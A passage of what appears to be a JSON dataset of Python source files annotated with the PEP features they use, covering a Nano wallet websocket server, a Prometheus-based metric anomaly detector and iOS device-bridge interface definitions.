rpc.rpc_reconnect(ws, r, account)\n                        if 'fcm_token' in request_json:\n                            await update_fcm_token_for_account(account, request_json['fcm_token'], r)\n                        elif 'fcm_token_v2' in request_json and 'notification_enabled' in request_json:\n                            if request_json['notification_enabled']:\n                                await update_fcm_token_for_account(account, request_json['fcm_token_v2'], r, v2=True)\n                            else:\n                                await delete_fcm_token_for_account(account, request_json['fcm_token_v2'], r) \n                    except Exception as e:\n                        log.server_logger.error('reconnect error; %s; %s; %s', str(e), address, uid)\n                        reply = {'error': 'reconnect error', 'detail': str(e)}\n                        if requestid is not None: reply['request_id'] = requestid\n                        ret = json.dumps(reply)\n                else:\n                    log.server_logger.info('subscribe request; %s; %s', util.get_request_ip(r), uid)\n                    try:\n                        if 'currency' in request_json and request_json['currency'] in currency_list:\n                            currency = request_json['currency']\n                        else:\n                            currency = 'usd'\n                        await rpc.rpc_subscribe(ws, r, request_json['account'].replace(\"nano_\", \"xrb_\"), currency)\n                        if 'fcm_token' in request_json:\n                            await update_fcm_token_for_account(request_json['account'], request_json['fcm_token'], r)\n                        elif 'fcm_token_v2' in request_json and 'notification_enabled' in request_json:\n                            if request_json['notification_enabled']:\n                                await update_fcm_token_for_account(request_json['account'], request_json['fcm_token_v2'], r, v2=True)\n                            else:\n                                await delete_fcm_token_for_account(request_json['account'], request_json['fcm_token_v2'], r)\n                    except Exception as e:\n                        log.server_logger.error('subscribe error;%s;%s;%s', str(e), address, uid)\n                        reply = {'error': 'subscribe error', 'detail': str(e)}\n                        if requestid is not None: reply['request_id'] = requestid\n                        ret = json.dumps(reply)\n            elif request_json['action'] == \"fcm_update\":\n                if 'fcm_token_v2' in request_json and 'account' in request_json and 'enabled' in request_json:\n                    if request_json['enabled']:\n                        await update_fcm_token_for_account(request_json['account'], request_json['fcm_token_v2'], r, v2=True)\n                    else:\n                        await delete_fcm_token_for_account(request_json['account'], request_json['fcm_token_v2'], r)\n            elif request_json['action'] == \"price_data\":\n                log.server_logger.info('price data request;%s;%s', util.get_request_ip(r), uid)\n                try:\n                    if request_json['currency'].upper() in currency_list:\n                        try:\n                            price = await r.app['rdata'].hget(\"prices\",\n                                                f\"{price_prefix}-\" + request_json['currency'].lower())\n                            reply = json.dumps({\n                                'currency': request_json['currency'].lower(),\n                                'price': str(price)\n                            })\n                            ret = reply\n                        except Exception:\n                            log.server_logger.error(\n                                'price data error, unable to get price;%s;%s', util.get_request_ip(r), uid)\n                            ret = json.dumps({\n                                'error':'price data error - unable to get price'\n                            })\n                    else:\n                        log.server_logger.error(\n                            'price data error, unknown currency;%s;%s', util.get_request_ip(r), uid)\n                        ret = json.dumps({\n                            'error':'unknown currency'\n                        })\n                except Exception as e:\n                    log.server_logger.error('price data error;%s;%s;%s', str(e), util.get_request_ip(r), uid)\n                    ret = json.dumps({\n                        'error':'price data error',\n                        'details':str(e)\n                    })\n            elif request_json['action'] == \"account_check\":\n                log.server_logger.info('account check request;%s;%s', util.get_request_ip(r), uid)\n                try:\n                    response = await rpc.rpc_accountcheck(r, uid, request_json['account'])\n                    ret = json.dumps(response)\n                except Exception as e:\n                    log.server_logger.error('account check error;%s;%s;%s', str(e), util.get_request_ip(r), uid)\n                    ret = json.dumps({\n                        'error': 'account check error',\n                        'detail': str(e)\n                    })\n            elif request_json['action'] == \"process\":\n                try:\n                    do_work = False\n                    if 'do_work' in request_json and request_json['do_work'] == True:\n                        do_work = True\n                    subtype = None\n                    if 'subtype' in request_json:\n                        subtype = request_json['subtype']\n                    reply = await rpc.process_defer(r, uid, json.loads(request_json['block']), do_work, subtype=subtype)\n                    if reply is None:\n                        raise Exception\n                    ret = json.dumps(reply)\n                except Exception as e:\n                    log.server_logger.error('process rpc error;%s;%s;%s;User-Agent:%s',\n                        str(e), util.get_request_ip(r), uid, str(r.headers.get('User-Agent')))\n                    ret = json.dumps({\n                        'error':'process rpc error',\n                        'detail':str(e)\n                    })\n            elif request_json['action'] == \"pending\":\n                try:\n                    reply = await rpc.pending_defer(r, uid, request_json)\n                    if reply is None:\n                        raise Exception\n                    ret = json.dumps(reply)\n                except Exception as e:\n                    log.server_logger.error('pending rpc error;%s;%s;%s;User-Agent:%s', str(\n                        e), util.get_request_ip(r), uid, str(r.headers.get('User-Agent')))\n                    ret = json.dumps({\n                        'error':'pending rpc error',\n                        'detail':str(e)\n                    })\n            elif request_json['action'] == 'account_history':\n                if await r.app['rdata'].hget(uid, \"account\") is None:\n                    await r.app['rdata'].hset(uid, \"account\", json.dumps([request_json['account']]))\n                try:\n                    response = await rpc.json_post(request_json)\n                    if response is None:\n                        raise Exception\n                    ret = json.dumps(response)\n                except Exception as e:\n                    log.server_logger.error('rpc error;%s;%s;%s', str(e), util.get_request_ip(r), uid)\n                    ret = json.dumps({\n                        'error':'account_history rpc error',\n                        'detail': str(e)\n                    })\n            else:\n                try:\n                    response = await rpc.json_post(request_json)\n                    if response is None:\n                        raise Exception\n                    ret = json.dumps(response)\n                except Exception as e:\n                    log.server_logger.error('rpc error;%s;%s;%s', str(e), util.get_request_ip(r), uid)\n                    ret = json.dumps({\n                        'error':'rpc error',\n                        'detail': str(e)\n                    })\n    except Exception as e:\n        log.server_logger.exception('uncaught error;%s;%s', util.get_request_ip(r), uid)\n        ret = json.dumps({\n            'error':'general error',\n            'detail':str(sys.exc_info())\n        })\n    finally:\n        r.app['active_messages'].remove(message)\n        return ret\nasync def websocket_handler(r : web.Request):\n    ws = web.WebSocketResponse()\n    await ws.prepare(r)\n    ws.id = str(uuid.uuid4())\n    r.app['clients'][ws.id] = ws\n    log.server_logger.info('new connection;%s;%s;User-Agent:%s', util.get_request_ip(r), ws.id, str(\n        r.headers.get('User-Agent')))\n    try:\n        async for msg in ws:\n            if msg.type == WSMsgType.TEXT:\n                if msg.data == 'close':\n                    await ws.close()\n                else:\n                    reply = await handle_user_message(r, msg.data, ws=ws)\n                    if reply is not None:\n                        log.server_logger.debug('Sending response %s to %s', reply, util.get_request_ip(r))\n                        await ws.send_str(reply)\n            elif msg.type == WSMsgType.CLOSE:\n                log.server_logger.info('WS Connection closed normally')\n                break\n            elif msg.type == WSMsgType.ERROR:\n                log.server_logger.info('WS Connection closed with error %s', ws.exception())\n                break\n        log.server_logger.info('WS connection closed normally')\n    except Exception:\n        log.server_logger.exception('WS Closed with exception')\n    finally:\n        if ws.id in r.app['clients']:\n            del r.app['clients'][ws.id]\n        for acct in r.app['subscriptions']:\n            if ws.id in r.app['subscriptions'][acct]:\n                if len(r.app['subscriptions'][acct]) == 1:\n                    del r.app['subscriptions'][acct]\n                    break\n                else:\n                    r.app['subscriptions'][acct].remove(ws.id)\n                    break\n        await ws.close()\n    return ws\nasync def http_api(r: web.Request):\n    try:\n        request_json = await r.json()\n        reply = await handle_user_message(r, json.dumps(request_json))\n        if reply is not None:\n            return web.json_response(data=json.loads(reply))\n        else:\n            return web.json_response(data={'error':'bad request'})\n    except Exception:\n        log.server_logger.exception(\"received exception in http_api\")\n        return web.HTTPInternalServerError(reason=f\"Something went wrong {str(sys.exc_info())}\")\nasync def callback_ws(app: web.Application, data: dict):\n    link = data['block']['link_as_account']\n    if app['subscriptions'].get(link):\n        log.server_logger.info(\"Pushing to clients %s\", str(app['subscriptions'][link]))\n        for sub in app['subscriptions'][link]:\n            if sub in app['clients']:\n                if data['block']['subtype'] == 'send':\n                    data['is_send'] = 'true'\n                    await app['clients'][sub].send_str(json.dumps(data))\n    if data['block']['subtype'] == 'send' and link == 'nano_1natrium1o3z5519ifou7xii8crpxpk8y65qmkih8e8bpsjri651oza8imdd':\n        log.server_logger.info('Detected send to natrium account')\n        if 'amount' in data:\n            log.server_logger.info(f'emitting donation event for amount: {data[\"amount\"]}')\n            await sio.emit('donation_event', {'amount':data['amount']})\nasync def callback(r : web.Request):\n    try:\n        request_json = await r.json()\n        hash = request_json['hash']\n        log.server_logger.debug(f\"callback received {hash}\")\n        request_json['block'] = json.loads(request_json['block'])\n        link = request_json['block']['link_as_account']\n        if fcm_api_key is None:\n            return web.HTTPOk()\n        fcm_tokens = set(await get_fcm_tokens(link, r))\n        fcm_tokens_v2 = set(await get_fcm_tokens(link, r, v2=True))\n        if (fcm_tokens is None or len(fcm_tokens) == 0) and (fcm_tokens_v2 is None or len(fcm_tokens_v2) == 0):\n            return web.HTTPOk()\n        message = {\n            \"action\":\"block\",\n            \"hash\":request_json['block']['previous']\n        }\n        response = await rpc.json_post(message)\n        if response is None:\n            return web.HTTPOk()\n        cached_hash = await r.app['rdata'].get(f\"link_{hash}\")\n        if cached_hash is not None:\n            return web.HTTPOk()\n        prev_data = response\n        prev_data = prev_data['contents'] = json.loads(prev_data['contents'])\n        prev_balance = int(prev_data['contents']['balance'])\n        cur_balance = int(request_json['block']['balance'])\n        send_amount = prev_balance - cur_balance\n        if send_amount >= 1000000000000000000000000:\n            fcm = aiofcm.FCM(fcm_sender_id, fcm_api_key)\n            for t in fcm_tokens:\n                message = aiofcm.Message(\n                            device_token=t,\n                            data = {\n                                \"amount\": str(send_amount)\n                            },\n                            priority=aiofcm.PRIORITY_HIGH\n                )\n                await fcm.send_message(message)\n            notification_title = f\"Received {util.raw_to_nano(send_amount)} {'NANO' if not banano_mode else 'BANANO'}\"\n            notification_body = f\"Open {'Natrium' if not banano_mode else 'Kalium'} to view this transaction.\"\n            for t2 in fcm_tokens_v2:\n                message = aiofcm.Message(\n                    device_token = t2,\n                    notification = {\n                        \"title\":notification_title,\n                        \"body\":notification_body,\n                        \"sound\":\"default\",\n                        \"tag\":link\n                    },\n                    data = {\n                        \"click_action\": \"FLUTTER_NOTIFICATION_CLICK\",\n                        \"account\": link\n                    },\n                    priority=aiofcm.PRIORITY_HIGH\n                )\n                await fcm.send_message(message)\n        return web.HTTPOk()\n    except Exception:\n        log.server_logger.exception(\"received exception in callback\")\n        return web.HTTPInternalServerError(reason=f\"Something went wrong {str(sys.exc_info())}\")\nasync def send_prices(app):\n    while True:\n        try:\n            if 'clients' in app and len(app['clients']):\n                log.server_logger.info('pushing price data to %d connections', len(app['clients']))\n                btc = float(await app['rdata'].hget(\"prices\", f\"{price_prefix}-btc\"))\n                if banano_mode:\n                    nano = float(await app['rdata'].hget(\"prices\", f\"{price_prefix}-nano\"))\n                for client, ws in list(app['clients'].items()):\n                    try:\n                        try:\n                            currency = app['cur_prefs'][client]\n                        except Exception:\n                            currency = 'usd'\n                        price = float(await app['rdata'].hget(\"prices\", f\"{price_prefix}-\" + currency.lower()))\n                        response = {\n                            'currency':currency.lower(),\n                            \"price\":str(price),\n                            'btc':str(btc)\n                        }\n                        if banano_mode:\n                            response['nano'] = str(nano)\n                        await ws.send_str(json.dumps(response))\n                    except Exception:\n                        log.server_logger.exception('error pushing prices for client %s', client)\n        except Exception:\n            log.server_logger.exception(\"exception pushing price data\")\n        await asyncio.sleep(60)\nasync def init_app():\n    async def close_redis(app):\n        log.server_logger.info('Closing redis connections')\n        app['rdata'].close()\n    async def open_redis(app):\n        log.server_logger.info(\"Opening redis connections\")\n        app['rdata'] = await aioredis.create_redis_pool((redis_host, redis_port),\n                                                db=int(os.getenv('REDIS_DB', '2')), encoding='utf-8', minsize=2, maxsize=15)\n        app['clients'] = {} \n        app['last_msg'] = {} \n        app['active_messages'] = set() \n        app['cur_prefs'] = {} \n        app['subscriptions'] = {} \n        app['active_work'] = set() \n    if debug_mode:\n        logging.basicConfig(level=logging.DEBUG)\n    else:\n        root = logging.getLogger('aiohttp.server')\n        logging.basicConfig(level=logging.INFO)\n        if options.log_to_stdout:\n            handler = logging.StreamHandler(sys.stdout)\n            formatter = logging.Formatter(\"%(asctime)s;%(levelname)s;%(message)s\", \"%Y-%m-%d %H:%M:%S %z\")\n            handler.setFormatter(formatter)\n            root.addHandler(handler)\n        else:\n            handler = WatchedFileHandler(log_file)\n            formatter = logging.Formatter(\"%(asctime)s;%(levelname)s;%(message)s\", \"%Y-%m-%d %H:%M:%S %z\")\n            handler.setFormatter(formatter)\n            root.addHandler(handler)\n            root.addHandler(TimedRotatingFileHandler(log_file, when=\"d\", interval=1, backupCount=100))        \n    app = web.Application()\n    app.add_routes([web.get('/', websocket_handler)]) \n    app.add_routes([web.post('/callback', callback)]) \n    app.add_routes([web.post('/api', http_api)])      \n    app.on_startup.append(open_redis)\n    app.on_shutdown.append(close_redis)\n    return app\napp = loop.run_until_complete(init_app())\nsio = socketio.AsyncServer(async_mode='aiohttp', cors_allowed_origins='*')\nsio.attach(app)\ndef main():\n    price_task = loop.create_task(send_prices(app))\n    async def start():\n        runner = web.AppRunner(app)\n        tasks = [\n        ]\n        await runner.setup()\n        if app_path is not None:\n            site = web.UnixSite(runner, app_path)\n        else:\n            site = web.TCPSite(runner, listen_host, listen_port)\n        tasks.append(site.start())\n        log.server_logger.info(f\"Attempting to open WS connection to {options.websocket_url}\")\n        ws = WebsocketClient(app, options.websocket_url, callback_ws)\n        await ws.setup()\n        tasks.append(ws.loop())\n        await asyncio.wait(tasks)\n    async def end():\n        await app.shutdown()\n    try:\n        loop.run_until_complete(start())\n    except KeyboardInterrupt:\n        pass\n    finally:\n        price_task.cancel()\n        loop.run_until_complete(end())\n    loop.close()\nif __name__ == \"__main__\":\n    main()",
            "patterns": {
                "pep_567": [
                    [
                        4,
                        4,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        364,
                        378,
                        "async for",
                        "async for msg in ws:\n            if msg.type == WSMsgType.TEXT:\n                if msg.data == 'close':\n                    await ws.close()\n                else:\n                    reply = await handle_user_message(r, msg.data, ws=ws)\n                    if reply is not None:\n                        log.server_logger.debug('Sending response %s to %s', reply, util.get_request_ip(r))\n                        await ws.send_str(reply)\n            elif msg.type == WSMsgType.CLOSE:\n                log.server_logger.info('WS Connection closed normally')\n                break\n            elif msg.type == WSMsgType.ERROR:\n                log.server_logger.info('WS Connection closed with error %s', ws.exception())\n                break"
                    ]
                ],
                "pep_498": [
                    [
                        39,
                        "        server_desc = f'on {listen_host} port {listen_port}'"
                    ],
                    [
                        41,
                        "        server_desc = f'on {app_path}'"
                    ],
                    [
                        44,
                        "        print(f'Starting KALIUM Server (BANANO) {server_desc}')"
                    ],
                    [
                        47,
                        "        print(f'Starting NATRIUM Server (NANO) {server_desc}')"
                    ],
                    [
                        424,
                        "        log.server_logger.debug(f\"callback received {hash}\")"
                    ],
                    [
                        459,
                        "            notification_title = f\"Received {util.raw_to_nano(send_amount)} {'NANO' if not banano_mode else 'BANANO'}\""
                    ],
                    [
                        460,
                        "            notification_body = f\"Open {'Natrium' if not banano_mode else 'Kalium'} to view this transaction.\""
                    ],
                    [
                        561,
                        "        log.server_logger.info(f\"Attempting to open WS connection to {options.websocket_url}\")"
                    ],
                    [
                        418,
                        "            log.server_logger.info(f'emitting donation event for amount: {data[\"amount\"]}')"
                    ],
                    [
                        440,
                        "        cached_hash = await r.app['rdata'].get(f\"link_{hash}\")"
                    ],
                    [
                        405,
                        "        return web.HTTPInternalServerError(reason=f\"Something went wrong {str(sys.exc_info())}\")"
                    ],
                    [
                        480,
                        "        return web.HTTPInternalServerError(reason=f\"Something went wrong {str(sys.exc_info())}\")"
                    ],
                    [
                        486,
                        "                btc = float(await app['rdata'].hget(\"prices\", f\"{price_prefix}-btc\"))"
                    ],
                    [
                        488,
                        "                    nano = float(await app['rdata'].hget(\"prices\", f\"{price_prefix}-nano\"))"
                    ],
                    [
                        495,
                        "                        price = float(await app['rdata'].hget(\"prices\", f\"{price_prefix}-\" + currency.lower()))"
                    ],
                    [
                        254,
                        "                                                f\"{price_prefix}-\" + request_json['currency'].lower())"
                    ]
                ]
            }
        },
        "42": {
            "file": "import asyncio\nimport logging\nimport pandas as pd\nfrom datetime import datetime\nfrom queue import Queue\nimport time\nimport json\nimport os\nfrom prometheus_api_client import PrometheusConnect\nfrom opni_nats import NatsWrapper\nfrom metric_anomaly_detector import MetricAnomalyDetector\nfrom elasticsearch import AsyncElasticsearch\nfrom elasticsearch.exceptions import ConnectionTimeout\nfrom elasticsearch.helpers import BulkIndexError, async_streaming_bulk\nimport uuid\nPROMETHEUS_ENDPOINT = os.getenv( \"PROMETHEUS_ENDPOINT\", \"http://localhost:9090\")\nLOGGING_LEVEL = os.getenv(\"LOGGING_LEVEL\", \"DEBUG\")\nlogging.basicConfig(level=logging.INFO, format=\"%(asctime)s - %(name)s - %(message)s\")\nlogger = logging.getLogger(__file__)\nlogger.setLevel(LOGGING_LEVEL)\nprom = PrometheusConnect(url=PROMETHEUS_ENDPOINT, disable_ssl=True)\nLOOP_TIME_SECOND = float(60.0) \nES_ENDPOINT = os.getenv(\"ES_ENDPOINT\", \"https://localhost:9200\")\nES_USERNAME = os.getenv(\"ES_USERNAME\", \"admin\")\nES_PASSWORD = os.getenv(\"ES_PASSWORD\", \"admin\")\nES_RESERVED_KEYWORDS = {\n    \"_id\",\n    \"_index\",\n    \"_if_seq_no\",\n    \"_if_primary_term\",\n    \"_parent\",\n    \"_percolate\",\n    \"_retry_on_conflict\",\n    \"_routing\",\n    \"_timestamp\",\n    \"_type\",\n    \"_version\",\n    \"_version_type\",\n}\nes = AsyncElasticsearch(\n    [ES_ENDPOINT],\n    port=9200,\n    http_auth=(ES_USERNAME, ES_PASSWORD),\n    http_compress=True,\n    verify_certs=False,\n    use_ssl=False,\n    timeout=10,\n    max_retries=5,\n    retry_on_timeout=True,\n)\nasync def doc_generator(metrics_payloads):\n    for mp in metrics_payloads:\n        yield {\n            \"_index\": \"mymetrics\",\n            \"_id\": uuid.uuid4(),\n            \"_source\": {\n                k: mp[k]\n                for k in mp\n                if not (isinstance(mp[k], str) and not mp[k]) and k not in ES_RESERVED_KEYWORDS\n            },\n        }\nasync def load_history_data(metric_name, mad: MetricAnomalyDetector):\n    query = {\"query\":{\"match\" : {\"metric_name\" : metric_name}}, \"sort\" : [{\"timestamp\":{\"order\": \"desc\"}}]}\n    try:\n        history_data = await es.search(index=\"mymetrics\", body=query, size=1440)\n        mad.load(reversed(history_data[\"hits\"][\"hits\"]))\n    except Exception as e:\n        logger.warning(\"fail to load history metrics data!\")\nasync def update_metrics(inference_queue):\n    metrics_list = [\"cpu_usage\", \"memory_usage\", \"disk_usage\"] \n    mad_dict = {}\n    for metric_name in metrics_list:\n        mad = MetricAnomalyDetector(metric_name)\n        await load_history_data(metric_name, mad)\n        mad_dict[metric_name] = mad\n    while True:\n        new_data = await inference_queue.get()\n        starttime = time.time()\n        metrics_payloads = []\n        for metric_name in metrics_list:\n            if len(new_data[metric_name]) == 0:\n                continue\n            json_payload = mad_dict[metric_name].run(new_data[metric_name])\n            metrics_payloads.append(json_payload)\n        try:\n            async for ok, result in async_streaming_bulk(\n                es, doc_generator(metrics_payloads)\n            ):\n                action, result = result.popitem()\n                if not ok:\n                    logging.error(\"failed to {} document {}\".format())\n        except (BulkIndexError, ConnectionTimeout) as exception:\n            logging.error(\"Failed to index data\")\n            logging.error(exception)\ndef convert_time(ts):\n    return datetime.fromtimestamp(float(ts)).strftime(\"%Y-%m-%d %H:%M:%S\")\nasync def scrape_prometheus_metrics(inference_queue):\n    starttime = time.time()\n    wait_time = int(starttime) // 60 * 60 + 60 - starttime\n    await asyncio.sleep(wait_time)\n    starttime = time.time()\n    logger.debug(f\"wait time : {wait_time}, current time : {convert_time(starttime)}\")\n    while True:\n        thistime = time.time()\n        current_cpu_usage_data = prom.custom_query(query='100 * (1- (avg(irate(node_cpu_seconds_total{mode=\"idle\"}[2m]))))')\n        memory_usage = prom.custom_query(query='100 * (1 - sum(node_memory_MemAvailable_bytes) / sum(node_memory_MemTotal_bytes))')\n        disk_usage = prom.custom_query(query='(sum(node_filesystem_size_bytes{device!~\"rootfs|HarddiskVolume.+\"})- sum(node_filesystem_free_bytes{device!~\"rootfs|HarddiskVolume.+\"})) / sum(node_filesystem_size_bytes{device!~\"rootfs|HarddiskVolume.+\"}) * 100 ')\n        inference_queue_payload = {\"cpu_usage\": current_cpu_usage_data, \"memory_usage\" : memory_usage, \"disk_usage\" : disk_usage}\n        await inference_queue.put(inference_queue_payload)\n        await asyncio.sleep(LOOP_TIME_SECOND - ((time.time() - starttime) % LOOP_TIME_SECOND))\nif __name__ == \"__main__\":\n    loop = asyncio.get_event_loop()\n    inference_queue = asyncio.Queue(loop=loop)\n    prometheus_scraper_coroutine = scrape_prometheus_metrics(inference_queue)\n    update_metrics_coroutine = update_metrics(inference_queue)\n    loop.run_until_complete(\n        asyncio.gather(\n            prometheus_scraper_coroutine,\n            update_metrics_coroutine\n        )\n    )\n    try:\n        loop.run_forever()\n    finally:\n        loop.close()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        51,
                        61,
                        "async generator",
                        "async def doc_generator(metrics_payloads):\n    for mp in metrics_payloads:\n        yield {\n            \"_index\": \"mymetrics\",\n            \"_id\": uuid.uuid4(),\n            \"_source\": {\n                k: mp[k]\n                for k in mp\n                if not (isinstance(mp[k], str) and not mp[k]) and k not in ES_RESERVED_KEYWORDS\n            },\n        }"
                    ],
                    [
                        86,
                        91,
                        "async for",
                        "async for ok, result in async_streaming_bulk(\n                es, doc_generator(metrics_payloads)\n            ):\n                action, result = result.popitem()\n                if not ok:\n                    logging.error(\"failed to {} document {}\".format())"
                    ]
                ],
                "pep_498v": [
                    [
                        91,
                        91,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        102,
                        "    logger.debug(f\"wait time : {wait_time}, current time : {convert_time(starttime)}\")"
                    ]
                ]
            }
        },
        "43": {
            "file": "import asyncio\nimport json\nfrom abc import ABC, abstractmethod, abstractproperty\nfrom dataclasses import asdict, dataclass, field\nfrom datetime import timedelta\nfrom enum import Enum\nfrom io import StringIO\nfrom typing import (\n    IO,\n    AsyncContextManager,\n    AsyncGenerator,\n    AsyncIterable,\n    AsyncIterator,\n    Dict,\n    List,\n    Mapping,\n    Optional,\n    Set,\n    Tuple,\n    Union,\n)\nLoggingMetadata = Dict[str, Optional[Union[str, List[str], int, float]]]\nclass IdbException(Exception):\n    pass\nclass IdbConnectionException(Exception):\n    pass\n@dataclass(frozen=True)\nclass ExitWithCodeException(Exception):\n    exit_code: int\nclass Permission(Enum):\n    PHOTOS = 0\n    CAMERA = 1\n    CONTACTS = 2\n    URL = 3\n    LOCATION = 4\n    NOTIFICATION = 5\nclass TargetType(Enum):\n    DEVICE = 1\n    SIMULATOR = 2\n@dataclass(frozen=True)\nclass ECIDFilter:\n    ecid: int\nOnlyFilter = Union[TargetType, ECIDFilter]\nclass VideoFormat(Enum):\n    H264 = \"h264\"\n    RBGA = \"rbga\"\n    MJPEG = \"mjpeg\"\n    MINICAP = \"minicap\"\n@dataclass(frozen=True)\nclass TCPAddress:\n    host: str\n    port: int\n@dataclass(frozen=True)\nclass DomainSocketAddress:\n    path: str\nAddress = Union[TCPAddress, DomainSocketAddress]\nclass AppProcessState(Enum):\n    UNKNOWN = 0\n    NOT_RUNNING = 1\n    RUNNING = 2\n@dataclass(frozen=True)\nclass InstalledAppInfo:\n    bundle_id: str\n    name: str\n    architectures: Set[str]\n    install_type: str\n    process_state: AppProcessState\n    debuggable: bool\n@dataclass(frozen=True)\nclass InstrumentsTimings:\n    launch_error_timeout: Optional[float] = None\n    launch_retry_timeout: Optional[float] = None\n    terminate_timeout: Optional[float] = None\n    operation_duration: Optional[float] = None\nclass HIDButtonType(Enum):\n    APPLE_PAY = 1\n    HOME = 2\n    LOCK = 3\n    SIDE_BUTTON = 4\n    SIRI = 5\nConnectionDestination = Union[str, Address]\n@dataclass(frozen=True)\nclass CompanionInfo:\n    udid: str\n    is_local: bool\n    address: Address\n    metadata: LoggingMetadata = field(default_factory=dict)\n@dataclass(frozen=True)\nclass ScreenDimensions:\n    width: int\n    height: int\n    density: Optional[float]\n    width_points: Optional[int]\n    height_points: Optional[int]\nDeviceDetails = Mapping[str, Union[int, str]]\n@dataclass(frozen=True)\nclass TargetDescription:\n    udid: str\n    name: str\n    state: Optional[str]\n    target_type: Optional[str]\n    os_version: Optional[str]\n    architecture: Optional[str]\n    companion_info: Optional[CompanionInfo]\n    screen_dimensions: Optional[ScreenDimensions]\n    model: Optional[str] = None\n    device: Optional[DeviceDetails] = None\n    extended: Optional[DeviceDetails] = None\n    diagnostics: Optional[DeviceDetails] = None\n    metadata: LoggingMetadata = field(default_factory=dict)\n    @property\n    def as_json(self) -> str:\n        return json.dumps(asdict(self))\n@dataclass(frozen=True)\nclass FileEntryInfo:\n    path: str\n@dataclass(frozen=True)\nclass FileListing:\n    parent: str\n    entries: List[FileEntryInfo]\n@dataclass(frozen=True)\nclass AccessibilityInfo:\n    json: Optional[str]\n@dataclass(frozen=True)\nclass CrashLogInfo:\n    name: Optional[str]\n    bundle_id: Optional[str]\n    process_name: Optional[str]\n    parent_process_name: Optional[str]\n    process_identifier: Optional[int]\n    parent_process_identifier: Optional[int]\n    timestamp: Optional[int]\n@dataclass(frozen=True)\nclass CrashLog:\n    info: Optional[CrashLogInfo]\n    contents: Optional[str]\n@dataclass(frozen=True)\nclass CrashLogQuery:\n    since: Optional[int] = None\n    before: Optional[int] = None\n    bundle_id: Optional[str] = None\n    name: Optional[str] = None\n@dataclass(frozen=True)\nclass TestRunFailureInfo:\n    message: str\n    file: str\n    line: int\n@dataclass(frozen=True)\nclass TestAttachment:\n    payload: bytes\n    timestamp: float\n    name: str\n    uniform_type_identifier: str\n@dataclass(frozen=True)\nclass TestActivity:\n    title: str\n    duration: float\n    uuid: str\n    activity_type: str\n    start: float\n    finish: float\n    name: str\n    attachments: List[TestAttachment]\n    sub_activities: List[\"TestActivity\"]\n@dataclass(frozen=True)\nclass TestRunInfo:\n    bundle_name: str\n    class_name: str\n    method_name: str\n    logs: List[str]\n    duration: float\n    passed: bool\n    failure_info: Optional[TestRunFailureInfo]\n    activityLogs: Optional[List[TestActivity]]\n    crashed: bool\n    @property\n    def crashed_outside_test_case(self) -> bool:\n        return self.crashed and self.class_name == \"\" and self.method_name == \"\"\n@dataclass(frozen=True)\nclass InstalledTestInfo:\n    bundle_id: str\n    name: Optional[str]\n    architectures: Optional[Set[str]]\nclass HIDDirection(Enum):\n    DOWN = 0\n    UP = 1\n@dataclass(frozen=True)\nclass Point:\n    x: float\n    y: float\n@dataclass(frozen=True)\nclass HIDTouch:\n    point: Point\n@dataclass(frozen=True)\nclass HIDButton:\n    button: HIDButtonType\n@dataclass(frozen=True)\nclass HIDKey:\n    keycode: int\nHIDPressAction = Union[HIDTouch, HIDButton, HIDKey]\n@dataclass(frozen=True)\nclass HIDPress:\n    action: HIDPressAction\n    direction: HIDDirection\n@dataclass(frozen=True)\nclass HIDSwipe:\n    start: Point\n    end: Point\n    delta: Optional[float]\n    duration: Optional[float]\n@dataclass(frozen=True)\nclass HIDDelay:\n    duration: float\nHIDEvent = Union[HIDPress, HIDSwipe, HIDDelay]\n@dataclass(frozen=True)\nclass InstalledArtifact:\n    name: str\n    uuid: Optional[str]\n    progress: Optional[float]\nclass FileContainerType(Enum):\n    ROOT = \"root\"\n    MEDIA = \"media\"\n    CRASHES = \"crashes\"\n    PROVISIONING_PROFILES = \"provisioning_profiles\"\n    MDM_PROFILES = \"mdm_profiles\"\n    SPRINGBOARD_ICONS = \"springboard_icons\"\n    WALLPAPER = \"wallpaper\"\n    DISK_IMAGES = \"disk_images\"\nFileContainer = Optional[Union[str, FileContainerType]]\nclass Compression(Enum):\n    GZIP = 0\n    ZSTD = 1\nclass Companion(ABC):\n    @abstractmethod\n    async def create(\n        self, device_type: str, os_version: str, timeout: Optional[timedelta] = None\n    ) -> TargetDescription:\n        pass\n    @abstractmethod\n    async def boot(\n        self, udid: str, verify: bool = True, timeout: Optional[timedelta] = None\n    ) -> None:\n        pass\n    @abstractmethod\n    async def boot_headless(  \n        self, udid: str, verify: bool = True, timeout: Optional[timedelta] = None\n    ) -> AsyncContextManager[None]:\n        yield\n    @abstractmethod\n    async def shutdown(self, udid: str, timeout: Optional[timedelta] = None) -> None:\n        pass\n    @abstractmethod\n    async def erase(self, udid: str, timeout: Optional[timedelta] = None) -> None:\n        pass\n    @abstractmethod\n    async def clone(\n        self,\n        udid: str,\n        destination_device_set: Optional[str] = None,\n        timeout: Optional[timedelta] = None,\n    ) -> TargetDescription:\n        pass\n    @abstractmethod\n    async def delete(\n        self, udid: Optional[str], timeout: Optional[timedelta] = None\n    ) -> None:\n        pass\n    @abstractmethod\n    async def clean(self, udid: str, timeout: Optional[timedelta] = None) -> None:\n        pass\n    @abstractmethod\n    async def list_targets(\n        self, only: Optional[OnlyFilter] = None, timeout: Optional[timedelta] = None\n    ) -> List[TargetDescription]:\n        pass\n    @abstractmethod\n    async def tail_targets(\n        self, only: Optional[OnlyFilter] = None\n    ) -> AsyncGenerator[List[TargetDescription], None]:\n        yield\n    @abstractmethod\n    async def target_description(\n        self,\n        udid: Optional[str] = None,\n        only: Optional[OnlyFilter] = None,\n        timeout: Optional[timedelta] = None,\n    ) -> TargetDescription:\n        pass\n    @abstractmethod\n    async def unix_domain_server(  \n        self, udid: str, path: str, only: Optional[OnlyFilter] = None\n    ) -> AsyncContextManager[str]:\n        yield\nclass Client(ABC):\n    @abstractmethod\n    async def list_apps(\n        self, fetch_process_state: bool = True\n    ) -> List[InstalledAppInfo]:\n        pass\n    @abstractmethod\n    async def launch(\n        self,\n        bundle_id: str,\n        env: Optional[Dict[str, str]] = None,\n        args: Optional[List[str]] = None,\n        foreground_if_running: bool = False,\n        wait_for_debugger: bool = False,\n        stop: Optional[asyncio.Event] = None,\n    ) -> None:\n        pass\n    @abstractmethod\n    async def run_xctest(\n        self,\n        test_bundle_id: str,\n        app_bundle_id: str,\n        test_host_app_bundle_id: Optional[str] = 